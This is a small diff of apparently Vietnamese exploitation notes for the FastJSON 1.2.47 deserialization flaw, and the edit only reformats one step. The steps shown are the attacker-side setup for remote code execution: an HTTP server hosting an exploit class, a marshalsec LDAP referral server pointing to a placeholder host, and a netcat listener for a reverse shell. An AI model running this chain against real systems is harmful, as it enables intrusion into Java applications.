@@ -40,7 +40,8 @@ FastJSON 1.2.47 unsafe deserialization
   ---
   - Dùng python để tạo web service tạm thời, root directory là folder vừa tạo: `python3 -m http.server 1111`
   ---
-  - Enable LDAP service: `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://XXX.XXX.XXX.XXX:1111/#Exploit 9999`
+  - Enable LDAP service:
+  - `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://XXX.XXX.XXX.XXX:1111/#Exploit 9999`
   ---
   - nc monitor: `nc -lvvp 1888`
   ---
